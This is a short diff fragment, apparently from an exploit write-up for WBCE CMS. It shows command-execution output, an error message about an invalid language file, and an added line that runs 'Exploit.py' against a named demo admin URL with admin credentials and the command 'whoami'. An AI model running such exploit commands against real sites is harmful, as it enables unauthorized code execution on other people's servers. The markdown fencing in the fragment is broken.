@@ -75,8 +75,12 @@ uid=1000(soft) gid=1000(soft) groups=1000(soft)
 uid=1000(soft) gid=1000(soft) groups=1000(soft)
     <div class="top alertbox_error fg12 error-box">
         <i class=" fa fa-2x fa-warning signal"></i>
-
                     <p>Invalid WBCE CMS language file. Please check the text file.</p>
+
+### Exploit :
+
+```python3 Exploit.py https://demos6.softaculous.com/WBCE_CMShfwcsysb8z/admin/ admin password 'whoami'
+```
         
                     <p><a href="index.php" class="button">Back</a></p>```
 
